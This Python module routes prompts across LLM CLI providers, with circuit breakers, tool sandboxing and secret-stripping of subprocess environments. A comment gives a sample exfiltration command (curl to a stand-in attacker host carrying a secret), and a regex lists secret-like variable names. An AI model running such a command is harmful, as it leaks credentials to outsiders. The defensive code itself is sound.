"""Provider-agnostic LLM dispatch layer.

Used by ln-agent.py, benthic-bot.py, and benthic_api.py. Defines:

- `Provider` protocol — what every LLM CLI wrapper looks like.
- `ClaudeProvider`, `CodexProvider`, `OpenCodeProvider` — concrete subprocess wrappers.
- `CircuitBreaker` — shared failure tracking with optional quota cooldown.
- `ProviderChain` — ordered list of providers; first non-empty result wins.

The chain order is driven by the `PROVIDER_ORDER` env var (comma-separated names
like `codex,claude,opencode`). Per-provider model / effort / tool defaults come
from constructor args at each consumer's startup, so a single env-var change is
enough to swap the primary brain — no code edits required.

Design notes:

- Each provider owns its own `CircuitBreaker`. Failures in one don't penalize others.
- Surrogate stripping happens once in `ProviderChain.ask` before dispatch — Claude's
  API breaks on unpaired surrogates so this is mandatory before any Claude call,
  and harmless for the other providers.
- `**_` swallows provider-specific kwargs that a concrete implementation does
  not consume. This lets callers pass one kwarg dict through any chain ordering
  while each provider still honors the model, effort, and tool fields it owns.
"""

from __future__ import annotations

import copy
import logging
import os
import re
import subprocess
import tempfile
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, Protocol

log = logging.getLogger(__name__)


# ─── Helpers ─────────────────────────────────────────────────────────────────

def strip_surrogates(text: str) -> str:
    """Remove unpaired surrogates — Claude's API JSON parser crashes on them."""
    return text.encode("utf-8", errors="surrogatepass").decode("utf-8", errors="ignore")


def _bounded_provider_timeout(timeout, deadline):
    """Cap one subprocess timeout by an optional absolute monotonic deadline."""
    if deadline is None:
        return timeout
    remaining = float(deadline) - time.monotonic()
    if remaining <= 0:
        return None
    return min(float(timeout), remaining)


def _sleep_before_retry(delay, deadline):
    """Sleep no longer than the deadline and report whether retry time remains."""
    if deadline is None:
        time.sleep(delay)
        return True
    remaining = float(deadline) - time.monotonic()
    if remaining <= 0:
        return False
    time.sleep(min(float(delay), remaining))
    return float(deadline) - time.monotonic() > 0


# Env var NAMES matching this are stripped from a Codex subprocess's environment.
# Codex has a shell and allow-listed `curl`, so ANY secret inherited via env is
# exfiltratable (`curl https://attacker/?x=$SECRET`) regardless of filesystem
# denies — the FS profile does not cover the env channel.
_SECRET_ENV_RE = re.compile(
    r"(KEY|TOKEN|SECRET|PASSWORD|PASSWD|WALLET|PRIVATE|SEED|MNEMONIC|CRED)", re.I)


def build_provider_env(bin_path: str | Path, extra_env: dict | None = None,
                       strip_secret_vars: bool = False) -> dict:
    """Inject the provider binary's directory onto PATH and merge call-scoped env.

    PM2 and cron commonly strip PATH down to a minimal set that misses NVM,
    ~/.local/bin, etc. `extra_env` lets callers pass per-request routing metadata
    without mutating process-global os.environ.

    strip_secret_vars: drop secret-named env vars before handing the env to the
    subprocess. Used for Codex, which can shell out and exfiltrate inherited
    secrets; the filesystem profile does not cover the environment channel.

    Etherscan access is never reusable by a provider subprocess. It is removed
    after ``extra_env`` is merged so call-scoped values cannot reintroduce it.
    """
    base = dict(os.environ)
    if strip_secret_vars:
        base = {k: v for k, v in base.items()
                if not _SECRET_ENV_RE.search(k)}
    parent = str(Path(bin_path).expanduser().parent)
    env = {**base, "PATH": f"{parent}:{base.get('PATH', '')}"}
    if extra_env:
        env.update({k: str(v) for k, v in extra_env.items()})
    env.pop("ETHERSCAN_API_KEY", None)
    return env


# Patterns that indicate Claude has hit a quota/rate limit and should be
# cooled down rather than retried. Stored as a single delimited string so
# the literal isn't a long sequence of short tokens that secret scanners
# mistake for a BIP-39 seed phrase.
_CLAUDE_LIMIT_PATTERN_BLOB = (
    "status code 501|http 501|error 501"
    "|usage limit|monthly usage|quota|credit balance"
    "|rate limit|too many requests|exhausted"
    "|payment required|billing|overloaded|hit your limit"
)
CLAUDE_LIMIT_PATTERNS = tuple(p.strip() for p in _CLAUDE_LIMIT_PATTERN_BLOB.split("|") if p.strip())


def looks_like_claude_limit_error(stdout: str, stderr: str) -> bool:
    """Detect quota/rate-limit style failures that should trip a longer cooldown."""
    combined = f"{stdout}\n{stderr}".lower()
    return any(p in combined for p in CLAUDE_LIMIT_PATTERNS)


# ─── Circuit breaker ────────────────────────────────────────────────────────

class CircuitBreaker:
    """Thread-safe failure tracking with optional quota cooldown.

    Two states: consecutive-failure count (3 = breaker open) and an absolute
    cooldown timestamp (quota-style errors set this further out than failure
    counting alone would). `is_available()` returns False if either is in
    effect.
    """

    def __init__(self, max_failures: int = 3, name: str = "provider"):
        self.max_failures = max_failures
        self.name = name
        self._failures = 0
        self._unavailable_until = 0.0
        self._lock = threading.Lock()

    def is_available(self) -> bool:
        with self._lock:
            if self._unavailable_until > time.time():
                return False
            return self._failures < self.max_failures

    def cooldown_remaining(self) -> int:
        with self._lock:
            return max(0, int(self._unavailable_until - time.time()))

    def record_success(self):
        with self._lock:
            self._failures = 0

    def record_failure(self):
        with self._lock:
            self._failures += 1

    def open_cooldown(self, cooldown: int, reason: str = ""):
        with self._lock:
            until = time.time() + max(60, cooldown)
            self._failures = self.max_failures
            self._unavailable_until = max(self._unavailable_until, until)
        log.warning(f"{self.name} marked unavailable for {max(60, cooldown)}s: {reason[:200]}")

    def reset_failures(self):
        """Clear the consecutive-failure count but NOT the quota cooldown.
        Called at the start of each cycle in long-running agents — gives
        transiently-failed providers a fresh chance without ignoring a real
        quota lockout."""
        with self._lock:
            self._failures = 0


# ─── Provider protocol + implementations ────────────────────────────────────

@dataclass(frozen=True)
class ProviderCall:
    """Immutable model-selection metadata for one provider invocation."""

    model: str
    effort: str
    tier: str | None


@dataclass(frozen=True)
class ProviderResult:
    """Provider output paired with the immutable call metadata that produced it."""

    text: str
    provider: str
    model: str
    effort: str
    tier: str | None


class Provider(Protocol):
    """The interface every concrete provider must implement.

    `ask` returns the response string, or "" on failure. The caller can't
    distinguish "provider failed cleanly" from "model returned empty output",
    which is intentional — both should trigger fallback to the next provider.
    """
    name: str
    breaker: CircuitBreaker

    def ask(self, prompt: str, *, timeout: int, **kwargs) -> str: ...
    def is_available(self) -> bool: ...
    def resolved_call(self, **kwargs) -> ProviderCall: ...


# Default tier presets. Each provider can override or extend at construction.
# Tiers express *intent* ("I want a cheap classification call") without leaking
# any provider's model names into caller code. The Claude-specific "sonnet" and
# Codex-specific "gpt-5.6-luna" stay inside their own provider's tier table.
#
# IMPORTANT: factories below use copy.deepcopy() so per-instance mutations of
# tiers["classification"]["effort"] can't leak back into these module-level
# defaults (each tier maps to a nested dict, so a shallow copy would alias it).
_CODEX_CLASSIFY_MODEL = os.environ.get("CODEX_CLASSIFY_MODEL", "gpt-5.6-luna")

_CLAUDE_DEFAULT_TIERS: dict[str, dict] = {
    "classification": {"model": "sonnet", "effort": "low"},
    # "creative" intentionally omitted — falls through to construction defaults.
}
_CODEX_DEFAULT_TIERS: dict[str, dict] = {
    # Classification uses a cheaper Codex model by default; CODEX_CLASSIFY_MODEL
    # keeps the shared tier overridable without leaking model names into callers.
    "classification": {"model": _CODEX_CLASSIFY_MODEL, "effort": "low"},
}
_OPENCODE_DEFAULT_TIERS: dict[str, dict] = {}

# Codex 0.144 feature gates that can expose a callable capability. The explicit
# ``tools="__none__"`` contract disables each gate independently because
# suppressing web search alone still leaves shell, app, browser, image, and
# delegation tools available.
_CODEX_TEXT_ONLY_DISABLED_FEATURES = (
    "shell_tool",
    "apps",
    "plugins",
    "browser_use",
    "browser_use_external",
    "browser_use_full_cdp_access",
    "in_app_browser",
    "computer_use",
    "image_generation",
    "multi_agent",
    "hooks",
    "memories",
    "remote_plugin",
    "tool_suggest",
)
_CLAUDE_PATH_RULE_META = frozenset(",()[]{}*?\\")


def _canonical_media_paths(allowed_paths):
    """Validate an exact tuple of unique canonical regular-file paths."""
    if not isinstance(allowed_paths, tuple) or not allowed_paths:
        return None
    validated = []
    seen = set()
    for value in allowed_paths:
        if not isinstance(value, str) or not value or value in seen:
            return None
        if any(
            ord(char) < 32
            or ord(char) == 127
            for char in value
        ):
            return None
        path = Path(value)
        if not path.is_absolute() or path.is_symlink():
            return None
        try:
            resolved = path.resolve(strict=True)
        except (OSError, RuntimeError):
            return None
        if str(resolved) != value or not resolved.is_file():
            return None
        seen.add(value)
        validated.append(value)
    return tuple(validated)


def _claude_media_read_rules(allowed_paths):
    """Return exact Claude Read rules for validated immutable media paths."""
    paths = _canonical_media_paths(allowed_paths)
    if paths is None or any(
        char in _CLAUDE_PATH_RULE_META for value in paths for char in value
    ):
        return None
    return tuple(f"Read({value})" for value in paths)


@dataclass
class ClaudeProvider:
    """Wraps the `claude` CLI. Retries with exponential backoff, detects
    quota errors to trip a longer cooldown, supports per-call overrides for
    model / effort / tools.

    Tier shortcut: pass `tier="classification"` to request the cheap preset
    (sonnet + low effort by default) without naming Claude-specific models in
    caller code. Per-call kwargs (`model=`, `effort=`, `tools=`) always win
    over tier presets; tier presets win over construction defaults.
    """

    bin: str
    default_model: str | None = "opus"
    default_effort: str = "max"
    default_tools: str = ""
    cwd: str | None = None
    retries: int = 2
    quota_cooldown: int = 6 * 60 * 60
    name: str = "claude"
    wrapper: Callable[[str], str] | None = None
    tiers: dict[str, dict] = field(default_factory=lambda: copy.deepcopy(_CLAUDE_DEFAULT_TIERS))
    breaker: CircuitBreaker = field(init=False)

    def __post_init__(self):
        self.breaker = CircuitBreaker(max_failures=3, name="Claude CLI")

    def is_available(self) -> bool:
        return self.breaker.is_available()

    def resolved_call(self, *, tier=None, model=None, effort=None, **_) -> ProviderCall:
        """Resolve the exact Claude model, effort, and tier for one call."""
        tier_cfg = self.tiers.get(tier, {}) if tier else {}
        resolved_model = (
            model if model is not None
            else tier_cfg.get("model", self.default_model)
        )
        resolved_effort = (
            effort if effort is not None
            else tier_cfg.get("effort", self.default_effort)
        )
        return ProviderCall(
            model=str(resolved_model or ""),
            effort=str(resolved_effort),
            tier=tier,
        )

    def ask(self, prompt: str, *, timeout: int = 3600, tier: str | None = None,
            model: str | None = None, effort: str | None = None,
            tools: str | None = None, extra_env: dict | None = None,
            allowed_paths: tuple[str, ...] | None = None,
            _resolved_call: ProviderCall | None = None,
            _defer_success: bool = False,
            _deadline: float | None = None, **_) -> str:
        call = _resolved_call or self.resolved_call(
            tier=tier, model=model, effort=effort
        )
        effective_model = call.model or None
        effective_effort = call.effort
        tier_cfg = self.tiers.get(tier, {}) if tier else {}
        effective_tools = (tools if tools is not None
                           else tier_cfg.get("tools", self.default_tools))
        # Empty --allowedTools and an omitted --tools flag can expose Claude's
        # defaults, so hard stages constrain both tool availability and approval.
        if effective_tools == "":
            effective_tools = "__none__"
        hard_mode = effective_tools if effective_tools in {
            "__media__", "__research__", "__none__"
        } else None
        if hard_mode == "__media__":
            media_rules = _claude_media_read_rules(allowed_paths)
            if media_rules is None:
                log.warning("Claude media call rejected invalid allowed_paths")
                return ""
            hard_tools = "Read"
            allowed_tools = ",".join(media_rules)
        elif hard_mode == "__research__":
            hard_tools = "WebSearch,WebFetch"
            allowed_tools = hard_tools
        elif hard_mode == "__none__":
            hard_tools = ""
            allowed_tools = ""
        else:
            hard_tools = None
            allowed_tools = effective_tools

        # Wrapper parity with CodexProvider lets each runtime add output-discipline
        # instructions while preserving the provider-agnostic call contract.
        wrapped = self.wrapper(prompt) if self.wrapper else prompt

        for attempt in range(self.retries + 1):
            attempt_timeout = _bounded_provider_timeout(timeout, _deadline)
            if attempt_timeout is None:
                return ""
            cooldown = self.breaker.cooldown_remaining()
            if cooldown > 0:
                log.warning(f"Claude cooldown active ({cooldown}s remaining) — skipping")
                return ""
            if not self.breaker.is_available():
                log.warning("Claude CLI circuit breaker open — skipping")
                return ""

            try:
                cmd = [self.bin, "-p", "-", "--effort", effective_effort]
                if hard_mode is not None:
                    cmd.extend([
                        "--safe-mode",
                        "--tools", hard_tools,
                        "--allowedTools", allowed_tools,
                        "--permission-mode", "dontAsk",
                        "--no-session-persistence",
                        "--disable-slash-commands",
                    ])
                else:
                    cmd.extend(["--allowedTools", allowed_tools])
                if effective_model:
                    cmd.extend(["--model", effective_model])
                result = subprocess.run(
                    cmd, input=wrapped, capture_output=True, text=True,
                    timeout=attempt_timeout,
                    env=build_provider_env(self.bin, extra_env),
                    cwd=self.cwd,
                )
                response = result.stdout.strip() if result.stdout else ""
                stderr_out = result.stderr.strip() if result.stderr else ""
                combined_lower = f"{response}\n{stderr_out}".lower()
                if (result.returncode != 0
                        or not response
                        or response.startswith("Error:")
                        or response == "Execution error"
                        or "max turns" in response.lower()
                        or "max turns" in combined_lower):
                    log.warning(f"Claude error (attempt {attempt+1}/{self.retries+1}): "
                                f"{(response or stderr_out)[:200]}")
                    if stderr_out:
                        log.warning(f"Claude stderr: {stderr_out[:500]}")
                    if looks_like_claude_limit_error(response, stderr_out):
                        self.breaker.open_cooldown(self.quota_cooldown,
                                                    response or stderr_out)
                        return ""
                    if attempt < self.retries:
                        if _sleep_before_retry(5 * (attempt + 1), _deadline):
                            continue
                    self.breaker.record_failure()
                    return ""
                if not _defer_success:
                    self.breaker.record_success()
                return response
            except subprocess.TimeoutExpired:
                log.error(f"Claude CLI timed out (attempt {attempt+1}/{self.retries+1})")
                if attempt < self.retries:
                    if _sleep_before_retry(5 * (attempt + 1), _deadline):
                        continue
                self.breaker.record_failure()
                return ""
            except Exception as e:
                log.error(f"Claude CLI error (attempt {attempt+1}/{self.retries+1}): {e}")
                if attempt < self.retries:
                    if _sleep_before_retry(5 * (attempt + 1), _deadline):
                        continue
                self.breaker.record_failure()
                return ""
        return ""


def _codex_effective_timeout(caller_timeout: int, tools: str | None) -> int:
    """Honor caller timeouts for tool-free calls; floor tool calls at one hour."""
    return (
        caller_timeout
        if tools in ("", "__none__", "__media__", "__research__")
        else max(caller_timeout, 3600)
    )


@dataclass
class CodexProvider:
    """Wraps the `codex` CLI. Reasoning effort is set via `-c` config override
    because the CLI has no `--effort` flag. Wrapper callable lets each consumer
    inject its own preamble (loaded from a prompt template) without coupling
    providers.py to the prompt-loader machinery.

    Per-call `tier`, `model`, and `effort` kwargs override construction defaults.
    Default classification tier drops effort to "low" without changing the model.
    """

    bin: str
    model: str = "gpt-5.6-sol"
    effort: str = "xhigh"
    cwd: str | None = None
    sandbox_bypass: bool = True
    permission_profile: str | None = None
    add_dirs: list[str] = field(default_factory=list)
    wrapper: Callable[[str], str] | None = None
    name: str = "codex"
    tiers: dict[str, dict] = field(default_factory=lambda: copy.deepcopy(_CODEX_DEFAULT_TIERS))
    breaker: CircuitBreaker = field(init=False)

    def __post_init__(self):
        self.breaker = CircuitBreaker(max_failures=3, name="Codex CLI")

    def is_available(self) -> bool:
        return self.breaker.is_available()

    def resolved_call(self, *, tier=None, model=None, effort=None, **_) -> ProviderCall:
        """Resolve the exact Codex model, effort, and tier for one call."""
        tier_cfg = self.tiers.get(tier, {}) if tier else {}
        return ProviderCall(
            model=str(model if model is not None else tier_cfg.get("model", self.model)),
            effort=str(effort if effort is not None else tier_cfg.get("effort", self.effort)),
            tier=tier,
        )

    def ask(self, prompt: str, *, timeout: int = 3600, tier: str | None = None,
            model: str | None = None, effort: str | None = None,
            tools: str | None = None, extra_env: dict | None = None,
            permission_profile: str | None = None,
            allowed_paths: tuple[str, ...] | None = None,
            _resolved_call: ProviderCall | None = None,
            _defer_success: bool = False,
            _deadline: float | None = None, **_) -> str:
        # Honor the caller timeout for tool-free calls; floor tool/reasoning
        # calls at 1h so top-effort reasoning is not cut off prematurely.
        codex_timeout = _codex_effective_timeout(timeout, tools)
        codex_timeout = _bounded_provider_timeout(codex_timeout, _deadline)
        if codex_timeout is None:
            return ""
        call = _resolved_call or self.resolved_call(
            tier=tier, model=model, effort=effort
        )
        effective_model = call.model
        effective_effort = call.effort
        # Empty string OR None per-call falls back to the constructor default —
        # a blank profile must NEVER silently drop to full --bypass (footgun).
        effective_profile = permission_profile or self.permission_profile

        wrapped = self.wrapper(prompt) if self.wrapper else prompt
        output_path = None
        text_only_workspace = None
        try:
            text_only = tools == "__none__"
            media_only = tools == "__media__"
            research_only = tools == "__research__"
            media_paths = (
                _canonical_media_paths(allowed_paths) if media_only else ()
            )
            if media_only and media_paths is None:
                log.warning("Codex media call rejected invalid allowed_paths")
                return ""
            isolated = text_only or media_only or research_only
            execution_cwd = self.cwd
            if isolated:
                # A fresh empty cwd prevents project-local config, instructions,
                # hooks, and rules from contributing capabilities or context.
                text_only_workspace = tempfile.TemporaryDirectory(
                    prefix="codex-isolated-")
                execution_cwd = text_only_workspace.name
            with tempfile.NamedTemporaryFile(prefix="codex-out-", suffix=".txt",
                                             delete=False) as tmp:
                output_path = tmp.name
            # Context hygiene (2026-07-09): kill the curated-plugin session
            # ceremony (server-refreshed skill content injected into every call —
            # token burn + a supply-chain injection surface) and stop codex from
            # auto-reading workdir CLAUDE.md/AGENTS.md (a stale April copy fed
            # every prompt "Claude CLI is primary" for months). Benthic's context
            # comes ONLY from the prompts we build.
            cmd = [self.bin, "exec", "--skip-git-repo-check", "--ephemeral"]
            if isolated:
                # Isolated sentinels ignore inherited config and expose only the
                # explicitly selected text, image-read, or web-read capability.
                cmd.extend([
                    "--ignore-user-config",
                    "--ignore-rules",
                    "--sandbox", "read-only",
                    "-c", "approval_policy=never",
                    "-c", "tools.view_image=false",
                ])
                if research_only:
                    cmd.extend(["-c", "tools.web_search=true"])
                else:
                    cmd.extend(["-c", 'web_search="disabled"'])
                for feature in _CODEX_TEXT_ONLY_DISABLED_FEATURES:
                    cmd.extend(["--disable", feature])
            else:
                cmd.extend(["--disable", "plugins"])
            cmd.extend(["-c", "project_doc_max_bytes=0"])
            if not isolated and effective_profile:
                # Security: component-scoped profiles keep Codex tools working
                # while the OS sandbox makes non-needed ~/.claude secrets unreadable.
                cmd.extend(["-c", f"default_permissions={effective_profile}",
                            "-c", "approval_policy=never"])
            elif not isolated and self.sandbox_bypass:
                cmd.append("--dangerously-bypass-approvals-and-sandbox")
            # --add-dir is an older-sandbox writable-root setting that does NOT
            # compose with permission profiles (codex rejects/ignores the combo,
            # observed as request/sandbox errors). Only emit it in bypass mode;
            # under a profile, the profile's own filesystem rules govern access.
            if not isolated and not effective_profile:
                for d in self.add_dirs:
                    cmd.extend(["--add-dir", str(Path(d).expanduser())])
            if execution_cwd:
                cmd.extend(["-C", str(execution_cwd)])
            for media_path in media_paths:
                cmd.extend(["-i", media_path])
            cmd.extend([
                "-m", effective_model,
                # Codex CLI takes reasoning effort via -c (config override) — there is no --effort flag.
                "-c", f"model_reasoning_effort={effective_effort}",
            ])
            # Enable Codex's native web_search tool when the caller requested
            # web-capable tools (mirrors Claude's --allowedTools whitelist). On
            # creative calls `tools` is None or a real allowlist → search ON;
            # Tool-free calls pass "" / "__none__" and keep search disabled.
            # Without this, creative-tier Codex runs ungrounded — the root cause
            # of shallow, unverified takes once codex became the primary provider.
            if tools not in ("", "__none__", "__media__", "__research__"):
                cmd.extend(["-c", "tools.web_search=true"])
            cmd.extend(["-o", output_path, "-"])
            result = subprocess.run(
                cmd, input=wrapped, capture_output=True, text=True,
                timeout=codex_timeout,
                env=build_provider_env(self.bin, extra_env, strip_secret_vars=True),
                cwd=execution_cwd,
            )
            response = ""
            if output_path and Path(output_path).exists():
                response = Path(output_path).read_text().strip()
            if not response and result.stdout:
                response = result.stdout.strip()
            if result.returncode != 0 or not response:
                stderr_out = result.stderr.strip() if result.stderr else ""
                log.error(f"Codex failed: {(stderr_out or result.stdout or '')[:500]}")
                self.breaker.record_failure()
                return ""
            if not _defer_success:
                self.breaker.record_success()
            return response
        except subprocess.TimeoutExpired:
            log.error("Codex timed out")
            self.breaker.record_failure()
            return ""
        except Exception as e:
            log.error(f"Codex error: {e}")
            self.breaker.record_failure()
            return ""
        finally:
            if output_path:
                try:
                    Path(output_path).unlink(missing_ok=True)
                except Exception:
                    pass
            if text_only_workspace is not None:
                text_only_workspace.cleanup()


@dataclass
class OpenCodeProvider:
    """Wraps the `opencode` CLI in non-interactive `run` mode. Treated as
    unavailable when no model is configured — `OPENCODE_MODEL` defaults to ""
    so OpenCode silently sits out unless the operator opts in.

    OpenCode has no effort concept; the tier table only swaps the model.

    NOTE: `is_available()` requires `self.model` to be set at construction.
    A tier preset that supplies a model cannot resurrect an otherwise-unconfigured
    provider — the chain skips it before tier resolution runs. To opt OpenCode
    into the chain, set the `model` constructor arg (or `OPENCODE_MODEL` env)."""

    bin: str
    model: str = ""
    cwd: str | None = None
    wrapper: Callable[[str], str] | None = None
    name: str = "opencode"
    tiers: dict[str, dict] = field(default_factory=lambda: copy.deepcopy(_OPENCODE_DEFAULT_TIERS))
    breaker: CircuitBreaker = field(init=False)

    def __post_init__(self):
        self.breaker = CircuitBreaker(max_failures=3, name="OpenCode CLI")

    def is_available(self) -> bool:
        if not self.model:
            return False
        return self.breaker.is_available()

    def resolved_call(self, *, tier=None, model=None, **_) -> ProviderCall:
        """Resolve the exact OpenCode model and tier for one call."""
        tier_cfg = self.tiers.get(tier, {}) if tier else {}
        resolved_model = (
            model if model is not None
            else tier_cfg.get("model", self.model)
        )
        return ProviderCall(
            model=str(resolved_model or ""),
            effort="",
            tier=tier,
        )

    def ask(self, prompt: str, *, timeout: int = 3600, tier: str | None = None,
            model: str | None = None, extra_env: dict | None = None,
            tools: str | None = None,
            _resolved_call: ProviderCall | None = None,
            _defer_success: bool = False,
            _deadline: float | None = None, **_) -> str:
        if tools in {"__media__", "__research__"}:
            log.warning("OpenCode cannot enforce isolated tool mode %s; skipping", tools)
            return ""
        call = _resolved_call or self.resolved_call(tier=tier, model=model)
        effective_model = call.model
        if not effective_model:
            return ""
        opencode_timeout = _bounded_provider_timeout(timeout, _deadline)
        if opencode_timeout is None:
            return ""
        wrapped = self.wrapper(prompt) if self.wrapper else prompt
        try:
            result = subprocess.run(
                [self.bin, "run", "--model", effective_model],
                input=wrapped, capture_output=True, text=True,
                timeout=opencode_timeout,
                env=build_provider_env(self.bin, extra_env, strip_secret_vars=True),
                cwd=self.cwd,
            )
            response = result.stdout.strip() if result.stdout else ""
            if result.returncode != 0 or not response:
                log.error(f"OpenCode failed: {(result.stderr or result.stdout or '')[:500]}")
                self.breaker.record_failure()
                return ""
            if not _defer_success:
                self.breaker.record_success()
            return response
        except subprocess.TimeoutExpired:
            log.error("OpenCode timed out")
            self.breaker.record_failure()
            return ""
        except FileNotFoundError:
            log.debug("OpenCode binary not found — skipping")
            return ""
        except Exception as e:
            log.error(f"OpenCode error: {e}")
            self.breaker.record_failure()
            return ""


# ─── Chain ───────────────────────────────────────────────────────────────────

class ProviderChain:
    """Ordered list of providers. Tries each in turn, returns the first
    non-empty response. Unknown provider names in the env order are logged
    and skipped — letting you remove a provider from the chain by editing
    PROVIDER_ORDER without code changes."""

    def __init__(self, providers: list[Provider]):
        self.providers = providers
        self._by_name = {p.name: p for p in providers}

    @classmethod
    def from_env_order(cls, env_var: str, default: str,
                       providers: dict[str, Provider]) -> "ProviderChain":
        """Parse an env var like `codex,claude,opencode` into an ordered chain.
        Falls back to `default` if the env var is missing or empty."""
        order_raw = os.environ.get(env_var, default)
        names = [n.strip() for n in order_raw.split(",") if n.strip()]
        if not names:
            names = [n.strip() for n in default.split(",") if n.strip()]
        chain: list[Provider] = []
        for n in names:
            if n in providers:
                chain.append(providers[n])
            else:
                log.warning(f"Unknown provider '{n}' in {env_var} — skipping")
        return cls(chain)

    def _log_unknown_tier(self, tier):
        """Log unknown tier names without changing fallback behavior."""
        if (
            tier
            and any(provider.tiers for provider in self.providers)
            and not any(tier in provider.tiers for provider in self.providers)
        ):
            log.debug(
                "Unknown tier '%s' — no provider has a preset; "
                "falling through to construction defaults",
                tier,
            )

    def _ask_receipt(
            self, prompt, *, timeout, validator=None, max_attempts=None,
            deadline=None, **kwargs):
        """Return output plus the exact provider call metadata that produced it."""
        prompt = strip_surrogates(prompt)
        self._log_unknown_tier(kwargs.get("tier"))
        primary = self.providers[0] if self.providers else None
        attempts = 0
        for provider in self.providers:
            provider_timeout = _bounded_provider_timeout(timeout, deadline)
            if provider_timeout is None:
                break
            if not provider.is_available():
                continue
            if max_attempts is not None and attempts >= max_attempts:
                break
            attempts += 1
            call = provider.resolved_call(**kwargs)
            provider_kwargs = dict(kwargs)
            if deadline is not None:
                provider_kwargs["_deadline"] = deadline
            text = provider.ask(
                prompt,
                timeout=provider_timeout,
                _resolved_call=call,
                _defer_success=True,
                **provider_kwargs,
            )
            if (
                deadline is not None
                and time.monotonic() >= float(deadline)
            ):
                if text:
                    provider.breaker.record_failure()
                break
            if not text:
                continue
            valid = validator is None or validator(text)
            if (
                deadline is not None
                and time.monotonic() >= float(deadline)
            ):
                provider.breaker.record_failure()
                break
            if not valid:
                provider.breaker.record_failure()
                log.warning("Rejected contract-invalid output from %s", provider.name)
                continue
            provider.breaker.record_success()
            if primary is not None and provider is not primary:
                log.info("Provider fallback: answered by %s", provider.name)
            return ProviderResult(
                text, provider.name, call.model, call.effort, call.tier
            )
        return None

    def ask_with_receipt(
            self, prompt, *, timeout=3600, deadline=None, **kwargs):
        """Return a provider receipt for the first non-empty response."""
        return self._ask_receipt(
            prompt, timeout=timeout, deadline=deadline, **kwargs
        )

    def ask_validated(
            self, prompt, validator, *, timeout=3600, max_attempts=2,
            deadline=None, **kwargs):
        """Return the first contract-valid receipt after at most one fallback."""
        return self._ask_receipt(
            prompt,
            timeout=timeout,
            validator=validator,
            max_attempts=max_attempts,
            deadline=deadline,
            **kwargs,
        )

    def ask(
            self, prompt: str, *, timeout: int = 3600, deadline=None,
            **kwargs) -> str:
        """Return text from the first available provider with a non-empty result."""
        result = self.ask_with_receipt(
            prompt, timeout=timeout, deadline=deadline, **kwargs
        )
        return result.text if result else ""

    def reset_failures(self):
        """Reset transient failure counts on every provider. Use at the start
        of each long-running cycle so a previous cycle's transient errors don't
        keep a provider sidelined indefinitely."""
        for p in self.providers:
            p.breaker.reset_failures()

    def get(self, name: str) -> Provider | None:
        """Look up a provider by name. Returns None if not in the chain."""
        return self._by_name.get(name)

    def names(self) -> list[str]:
        """Names of providers in the chain, in order. Useful for startup log."""
        return [p.name for p in self.providers]
